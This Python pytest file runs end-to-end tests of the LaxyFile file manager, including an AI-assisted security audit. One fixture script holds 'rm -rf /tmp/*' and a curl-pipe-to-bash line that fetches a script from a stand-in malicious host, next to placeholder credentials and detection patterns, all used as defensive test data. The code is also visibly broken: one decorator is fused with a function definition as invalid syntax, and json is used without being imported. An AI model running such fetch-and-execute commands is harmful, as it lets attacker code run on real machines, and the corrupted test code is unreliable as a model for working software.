"""
End-to-end tests for complete user workflows

Tests full user scenarios from start to finish, simulating real-world usage
of LaxyFile with all components working together.
"""

import pytest
import asyncio
import tempfile
import shutil
from pathlib import Path
from unittest.mock import Mock, patch, AsyncMock
from datetime import datetime

from laxyfile.core.advanced_file_manager import AdvancedFileManager
from laxyfile.operations.file_ops import ComprehensiveFileOperations, ArchiveFormat
from laxyfile.ui.superfile_ui import SuperFileUI
from laxyfile.ui.enhanced_panels import EnhancedPanelManager
from laxyfile.ai.advanced_assistant import AdvancedAIAssistant, AnalysisType
from laxyfile.plugins.plugin_manager import PluginManager
from laxyfile.core.types import PanelData, SidebarData, StatusData


@pytest.mark.e2e
class TestCompleteFileManagementWorkflow:
    """Test complete file management workflows from start to finish"""

    @pytest.fixture
    def complete_system(self, mock_config, theme_manager, console, temp_dir):
        """Create complete LaxyFile system"""
        # Initialize all components
        file_manager = AdvancedFileManager(mock_config)
        file_operations = ComprehensiveFileOperations(mock_config)
        ui = SuperFileUI(theme_manager, console, mock_config)
        panel_manager = EnhancedPanelManager(file_manager)

        # AI system with mocked availability
        ai_config = {
            'ai_models': {
                'test_model': {
                    'provider': 'openrouter',
                    'model_name': 'test/model',
                    'api_key': 'test_key',
                    'capabilities': ['text_analysis', 'security_analysis', 'organization_analysis']
                }
            },
            'cache_size': 100,
            'cache_ttl': 3600
        }

        with patch('laxyfile.ai.advanced_assistant.AIModelManager._test_model_availability', return_value=True):
            ai_assistant = AdvancedAIAssistant(ai_config)

        plugin_manager = PluginManager(mock_config)

        return {
            'file_manager': file_manager,
            'file_operations': file_operations,
            'ui': ui,
            'panel_manager': panel_manager,
            'ai_assistant': ai_assistant,
            'plugin_manager': plugin_manager,
            'temp_dir': temp_dir
        }

    @pytest.mark.asyncionc def test_new_user_project_setup_workflow(self, complete_system):
        """Test complete workflow for new user setting up a project"""
        system = complete_system
        temp_dir = system['temp_dir']
        file_manager = system['file_manager']
        file_operations = system['file_operations']
        ui = system['ui']

        # Step 1: User starts LaxyFile and sees empty directory
        initial_files = await file_manager.list_directory(temp_dir)
        assert len(initial_files) == 1  # Only parent directory

        # Step 2: User creates project structure
        project_structure = [
            "src",
            "docs",
            "tests",
            "assets/images",
            "assets/css",
            "config"
        ]

        created_dirs = []
        for dir_path in project_structure:
            full_path = temp_dir / dir_path
            full_path.mkdir(parents=True, exist_ok=True)
            created_dirs.append(full_path)

        # Step 3: User creates initial files
        initial_files_data = [
            ("README.md", "# My Project\n\nThis is a new project."),
            ("src/main.py", "#!/usr/bin/env python3\nprint('Hello, World!')"),
            ("docs/index.md", "# Documentation\n\nProject documentation."),
            ("tests/test_main.py", "import unittest\n\nclass TestMain(unittest.TestCase):\n    pass"),
            ("config/settings.json", '{"debug": true, "version": "1.0.0"}'),
            (".gitignore", "__pycache__/\n*.pyc\n.env")
        ]

        created_files = []
        for filename, content in initial_files_data:
            file_path = temp_dir / filename
            file_path.write_text(content)
            created_files.append(file_path)

        # Step 4: User views the project in LaxyFile UI
        updated_files = await file_manager.list_directory(temp_dir)
        assert len(updated_files) > len(initial_files)

        # Create panel data for UI
        panel_data = PanelData(
            path=temp_dir,
            files=updated_files,
            current_selection=0,
            selected_files=set(),
            sort_type="name",
            reverse_sort=False,
            search_query=""
        )

        # Render file panel
        file_panel = ui.render_file_panel(panel_data)
        assert file_panel is not None

        panel_content = str(file_panel)
        assert "README.md" in panel_content
        assert "src" in panel_content
        assert "docs" in panel_content

        # Step 5: User navigates to src directory
        src_dir = temp_dir / "src"
        src_files = await file_manager.list_directory(src_dir)

        src_panel_data = PanelData(
            path=src_dir,
            files=src_files,
            current_selection=0,
            selected_files=set(),
            sort_type="name",
            reverse_sort=False,
            search_query=""
        )

        src_panel = ui.render_file_panel(src_panel_data)
        src_panel_content = str(src_panel)
        assert "main.py" in src_panel_content

        # Step 6: User creates backup archive
        files_to_backup = [f.path for f in updated_files if f.name != ".."]
        backup_path = temp_dir.parent / "project_backup.zip"

        progress_updates = []
        def progress_callback(current, total, speed=None):
            progress_updates.append((current, total))

        backup_result = await file_operations.create_archive(
            files_to_backup, backup_path, ArchiveFormat.ZIP, progress_callback
        )

        assert backup_result.success is True
        assert backup_path.exists()
        assert len(progress_updates) > 0

        # Step 7: User verifies backup contents
        backup_info = await file_manager.get_file_info(backup_path)
        assert backup_info.name == "project_backup.zip"
        assert backup_info.size > 0

    @pytest.mark.asyncio
    async def test_file_organization_workflow(self, complete_system):
        """Test complete file organization workflow"""
        system = complete_system
        temp_dir = system['temp_dir']
        file_manager = system['file_manager']
        file_operations = system['file_operations']
        ai_assistant = system['ai_assistant']

        # Step 1: User has messy directory with mixed file types
        messy_files = [
            ("report_2023.pdf", "PDF report content"),
            ("vacation_photo.jpg", "JPEG image data"),
            ("budget.xlsx", "Excel spreadsheet data"),
            ("script.py", "#!/usr/bin/env python3\nprint('Script')"),
            ("notes.txt", "Random notes and thoughts"),
            ("presentation.pptx", "PowerPoint presentation"),
            ("data_analysis.py", "import pandas as pd\ndf = pd.read_csv('data.csv')"),
            ("invoice.pdf", "Invoice document content"),
            ("family_photo.png", "PNG image data"),
            ("todo.txt", "1. Organize files\n2. Clean desktop")
        ]

        created_files = []
        for filename, content in messy_files:
            file_path = temp_dir / filename
            file_path.write_text(content)
            created_files.append(file_path)

        # Step 2: User views messy directory
        initial_files = await file_manager.list_directory(temp_dir)
        file_count = len([f for f in initial_files if f.name != ".."])
        assert file_count == len(messy_files)

        # Step 3: User requests AI analysis for organization
        ai_responses = []
        file_categories = {
            "report_2023.pdf": ("document", "documents"),
            "vacation_photo.jpg": ("image", "images"),
            "budget.xlsx": ("document", "documents"),
            "script.py": ("code", "code"),
            "notes.txt": ("document", "documents"),
            "presentation.pptx": ("document", "documents"),
            "data_analysis.py": ("code", "code"),
            "invoice.pdf": ("document", "documents"),
            "family_photo.png": ("image", "images"),
            "todo.txt": ("document", "documents")
        }

        for filename, (category, folder) in file_categories.items():
            mock_response = {
                "suggested_category": category,
                "folder_structure": [folder],
                "naming_suggestions": [f"organized_{filename}"],
                "tags": [category],
                "cleanup_action": "keep",
                "confidence": 0.9
            }
            ai_responses.append(json.dumps(mock_response))

        with patch.object(ai_assistant, '_call_model', side_effect=ai_responses):
            # Step 4: AI analyzes all files
            analysis_tasks = []
            for file_path in created_files:
                task = ai_assistant.analyze_file_comprehensive(
                    file_path, [AnalysisType.ORGANIZATION]
                )
                analysis_tasks.append(task)

            analysis_results = await asyncio.gather(*analysis_tasks)

            # Step 5: User creates organization structure based on AI suggestions
            suggested_folders = set()
            file_moves = []

            for i, results in enumerate(analysis_results):
                if results and len(results) > 0:
                    result = results[0]
                    if 'folder_structure' in result.results:
                        folders = result.results['folder_structure']
                        if folders:
                            target_folder = folders[0]
                            suggested_folders.add(target_folder)
                            file_moves.append((created_files[i], target_folder))

            # Create suggested directories
            created_org_dirs = []
            for folder_name in suggested_folders:
                folder_path = temp_dir / folder_name
                folder_path.mkdir(exist_ok=True)
                created_org_dirs.append(folder_path)

            # Step 6: User executes file moves based on AI suggestions
            move_results = []
            for source_file, target_folder in file_moves:
                target_dir = temp_dir / target_folder
                progress_callback = Mock()

                result = await file_operations.move_files(
                    [source_file], target_dir, progress_callback
                )
                move_results.append(result)

            # Verify all moves succeeded
            for result in move_results:
                assert result.success is True

            # Step 7: User verifies organized structure
            final_files = await file_manager.list_directory(temp_dir)
            folder_names = [f.name for f in final_files if f.is_dir and f.name != ".."]

            expected_folders = ["documents", "images", "code"]
            for expected_folder in expected_folders:
                assert expected_folder in folder_names

            # Verify files are in correct folders
            for folder_name in expected_folders:
                folder_path = temp_dir / folder_name
                folder_contents = await file_manager.list_directory(folder_path)
                folder_file_count = len([f for f in folder_contents if f.name != ".."])
                assert folder_file_count > 0

    @pytest.mark.asyncio
    async def test_security_audit_workflow(self, complete_system):
        """Test complete security audit workflow"""
        system = complete_system
        temp_dir = system['temp_dir']
        file_manager = system['file_manager']
        file_operations = system['file_operations']
        ai_assistant = system['ai_assistant']
        ui = system['ui']

        # Step 1: User has directory with potential security issues
        security_test_files = [
            ("safe_document.txt", "This is a safe document with normal content.", "low"),
            ("config_with_secrets.env", "DATABASE_PASSWORD=admin123\nAPI_KEY=secret_key_here", "high"),
            ("suspicious_script.sh", "#!/bin/bash\nrm -rf /tmp/*\ncurl http://malicious.com/script.sh | bash", "critical"),
            ("old_backup.sql", "-- Database backup\nINSERT INTO users VALUES ('admin', 'password123');", "medium"),
            ("normal_code.py", "import os\nprint('Hello World')", "low"),
            ("potential_malware.exe", "MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00", "critical")
        ]

        created_files = []
        risk_levels = {}
        for filename, content, risk_level in security_test_files:
            file_path = temp_dir / filename
            if filename.endswith('.exe'):
                file_path.write_bytes(content.encode('latin1'))
            else:
                file_path.write_text(content)
            created_files.append(file_path)
            risk_levels[filename] = risk_level

        # Step 2: User initiates security audit
        initial_files = await file_manager.list_directory(temp_dir)
        files_to_audit = [f for f in initial_files if f.name != ".."]

        # Step 3: AI performs security analysis
        security_responses = []
        for filename, _, risk_level in security_test_files:
            if risk_level == "critical":
                mock_response = {
                    "risk_level": "critical",
                    "vulnerabilities": ["Malicious code execution", "System compromise"],
                    "suspicious_patterns": ["rm -rf", "curl | bash", "executable signature"],
                    "privacy_issues": [],
                    "recommendations": ["QUARANTINE IMMEDIATELY", "Run antivirus scan"],
                    "confidence": 0.98
                }
            elif risk_level == "high":
                mock_response = {
                    "risk_level": "high",
                    "vulnerabilities": ["Credential exposure", "Authentication bypass"],
                    "suspicious_patterns": ["PASSWORD=", "API_KEY="],
                    "privacy_issues": ["Hardcoded credentials", "Sensitive data exposure"],
                    "recommendations": ["Secure credentials", "Use environment variables"],
                    "confidence": 0.95
                }
            elif risk_level == "medium":
                mock_response = {
                    "risk_level": "medium",
                    "vulnerabilities": ["Data exposure"],
                    "suspicious_patterns": ["password123", "INSERT INTO users"],
                    "privacy_issues": ["Database credentials"],
                    "recommendations": ["Review backup security", "Encrypt sensitive data"],
                    "confidence": 0.85
                }
            else:
                mock_response = {
                    "risk_level": "low",
                    "vulnerabilities": [],
                    "suspicious_patterns": [],
                    "privacy_issues": [],
                    "recommendations": ["File appears safe"],
                    "confidence": 0.8
                }
            security_responses.append(json.dumps(mock_response))

        with patch.object(ai_assistant, '_call_model', side_effect=security_responses):
            # Step 4: Perform security analysis on all files
            security_tasks = []
            for file_path in created_files:
                task = ai_assistant.analyze_file_comprehensive(
                    file_path, [AnalysisType.SECURITY]
                )
                security_tasks.append(task)

            security_results = await asyncio.gather(*security_tasks)

            # Step 5: User reviews security report in UI
            high_risk_files = []
            medium_risk_files = []
            security_summary = {
                "critical": 0,
                "high": 0,
                "medium": 0,
                "low": 0
            }

            for i, results in enumerate(security_results):
                if results and len(results) > 0:
                    result = results[0]
                    if 'risk_level' in result.results:
                        risk_level = result.results['risk_level']
                        security_summary[risk_level] += 1

                        if risk_level in ['critical', 'high']:
                            high_risk_files.append(created_files[i])
                        elif risk_level == 'medium':
                            medium_risk_files.append(created_files[i])

            # Display security summary in UI
            from rich.text import Text
            from rich.panel import Panel

            summary_text = Text()
            summary_text.append("Security Audit Results\n\n", style="bold red")
            summary_text.append(f"Critical Risk: {security_summary['critical']} files\n", style="bold red")
            summary_text.append(f"High Risk: {security_summary['high']} files\n", style="bold yellow")
            summary_text.append(f"Medium Risk: {security_summary['medium']} files\n", style="yellow")
            summary_text.append(f"Low Risk: {security_summary['low']} files\n", style="green")

            security_panel = Panel(summary_text, title="Security Audit")
            security_modal = ui.create_modal_overlay(security_panel, "Security Report")

            assert security_modal is not None
            modal_content = str(security_modal)
            assert "Security Audit Results" in modal_content

            # Step 6: User takes action on high-risk files
            if high_risk_files:
                # Create quarantine directory
                quarantine_dir = temp_dir / "quarantine"
                quarantine_dir.mkdir()

                # Move high-risk files to quarantine
                progress_callback = Mock()
                quarantine_result = await file_operations.move_files(
                    high_risk_files, quarantine_dir, progress_callback
                )
                assert quarantine_result.success is True

                # Verify files were quarantined
                quarantine_contents = await file_manager.list_directory(quarantine_dir)
                quarantined_names = [f.name for f in quarantine_contents if f.name != ".."]

                for high_risk_file in high_risk_files:
                    assert high_risk_file.name in quarantined_names
                    assert not high_risk_file.exists()  # Original should be moved

            # Step 7: User secures medium-risk files
            if medium_risk_files:
                # Create secure directory
                secure_dir = temp_dir / "secure_review"
                secure_dir.mkdir()

                progress_callback = Mock()
                secure_result = await file_operations.move_files(
                    medium_risk_files, secure_dir, progress_callback
                )
                assert secure_result.success is True

        # Step 8: User verifies final security state
        final_files = await file_manager.list_directory(temp_dir)
        remaining_files = [f for f in final_files if f.name not in ["..", "quarantine", "secure_review"]]

        # Should only have low-risk files remaining in main directory
        assert len(remaining_files) <= security_summary['low']

    @pytest.mark.asyncio
    async def test_collaborative_project_workflow(self, complete_system):
        """Test workflow for collaborative project management"""
        system = complete_system
        temp_dir = system['temp_dir']
        file_manager = system['file_manager']
        file_operations = system['file_operations']
        ui = system['ui']

        # Step 1: User sets up collaborative project structure
        project_dirs = [
            "team_members/alice",
            "team_members/bob",
            "team_members/charlie",
            "shared/documents",
            "shared/resources",
            "shared/templates",
            "archive/old_versions",
            "review/pending",
            "review/approved"
        ]

        for dir_path in project_dirs:
            (temp_dir / dir_path).mkdir(parents=True, exist_ok=True)

        # Step 2: Team members contribute files
        team_contributions = [
            ("team_members/alice/research_notes.md", "# Research Notes\n\nAlice's research findings..."),
            ("team_members/alice/data_analysis.py", "import pandas as pd\n# Alice's analysis script"),
            ("team_members/bob/design_mockups.png", "PNG mockup data"),
            ("team_members/bob/ui_components.css", ".button { background: blue; }"),
            ("team_members/charlie/backend_api.py", "from flask import Flask\napp = Flask(__name__)"),
            ("team_members/charlie/database_schema.sql", "CREATE TABLE users (id INT, name VARCHAR(50));"),
            ("shared/documents/project_plan.docx", "Project planning document"),
            ("shared/documents/requirements.txt", "Project requirements and specifications"),
            ("shared/resources/logo.svg", "<svg>Logo design</svg>"),
            ("shared/templates/email_template.html", "<html><body>Email template</body></html>")
        ]

        created_files = []
        for file_path, content in team_contributions:
            full_path = temp_dir / file_path
            full_path.write_text(content)
            created_files.append(full_path)

        # Step 3: User reviews all contributions
        all_files = await file_manager.list_directory(temp_dir)
        team_dirs = [f for f in all_files if f.is_dir and f.name == "team_members"]
        assert len(team_dirs) == 1

        team_members_dir = temp_dir / "team_members"
        members = await file_manager.list_directory(team_members_dir)
        member_names = [f.name for f in members if f.is_dir and f.name != ".."]
        assert "alice" in member_names
        assert "bob" in member_names
        assert "charlie" in member_names

        # Step 4: User consolidates shared resources
        shared_files = []
        for member in ["alice", "bob", "charlie"]:
            member_dir = team_members_dir / member
            member_files = await file_manager.list_directory(member_dir)

            for file_info in member_files:
                if file_info.name != ".." and file_info.name.endswith(('.md', '.txt', '.docx')):
                    shared_files.append(file_info.path)

        if shared_files:
            shared_docs_dir = temp_dir / "shared" / "documents"
            progress_callback = Mock()

            # Copy (not move) shared documents to shared area
            copy_result = await file_operations.copy_files(
                shared_files, shared_docs_dir, progress_callback
            )
            assert copy_result.success is True

        # Step 5: User creates project archive for distribution
        files_to_archive = []

        # Include all shared files and final versions
        shared_dir = temp_dir / "shared"
        shared_contents = await file_manager.list_directory(shared_dir)
        for shared_item in shared_contents:
            if shared_item.name != "..":
                if shared_item.is_dir:
                    # Get files from subdirectories
                    subdir_files = await file_manager.list_directory(shared_item.path)
                    for subfile in subdir_files:
                        if subfile.name != "..":
                            files_to_archive.append(subfile.path)
                else:
                    files_to_archive.append(shared_item.path)

        if files_to_archive:
            archive_path = temp_dir / "project_release_v1.0.zip"
            progress_callback = Mock()

            archive_result = await file_operations.create_archive(
                files_to_archive, archive_path, ArchiveFormat.ZIP, progress_callback
            )
            assert archive_result.success is True
            assert archive_path.exists()

        # Step 6: User creates backup of entire project
        all_project_files = []
        for root_item in all_files:
            if root_item.name != ".." and root_item.name != "project_release_v1.0.zip":
                if root_item.is_dir:
                    # Recursively get all files
                    async def collect_files(directory):
                        collected = []
                        dir_contents = await file_manager.list_directory(directory)
                        for item in dir_contents:
                            if item.name != "..":
                                if item.is_dir:
                                    sub_files = await collect_files(item.path)
                                    collected.extend(sub_files)
                                else:
                                    collected.append(item.path)
                        return collected

                    dir_files = await collect_files(root_item.path)
                    all_project_files.extend(dir_files)
                else:
                    all_project_files.append(root_item.path)

        if all_project_files:
            backup_path = temp_dir.parent / "project_full_backup.tar.gz"
            progress_callback = Mock()

            backup_result = await file_operations.create_archive(
                all_project_files, backup_path, ArchiveFormat.TAR_GZ, progress_callback
            )
            assert backup_result.success is True
            assert backup_path.exists()

        # Step 7: User verifies project structure in UI
        final_structure = await file_manager.list_directory(temp_dir)

        panel_data = PanelData(
            path=temp_dir,
            files=final_structure,
            current_selection=0,
            selected_files=set(),
            sort_type="name",
            reverse_sort=False,
            search_query=""
        )

        project_panel = ui.render_file_panel(panel_data)
        panel_content = str(project_panel)

        assert "team_members" in panel_content
        assert "shared" in panel_content
        assert "archive" in panel_content
        assert "review" in panel_content
        assert "project_release_v1.0.zip" in panel_content

        # Verify project statistics
        total_files = len([f for f in final_structure if not f.is_dir and f.name != ".."])
        total_dirs = len([f for f in final_structure if f.is_dir and f.name != ".."])

        status_data = StatusData(
            current_file=None,
            selected_count=0,
            total_files=total_files,
            total_size=sum(f.size for f in final_structure if not f.is_dir),
            operation_status=f"Project complete: {total_dirs} directories, {total_files} files",
            ai_status=""
        )

        status_panel = ui.render_footer(status_data)
        status_content = str(status_panel)
        assert "Project complete" in status_content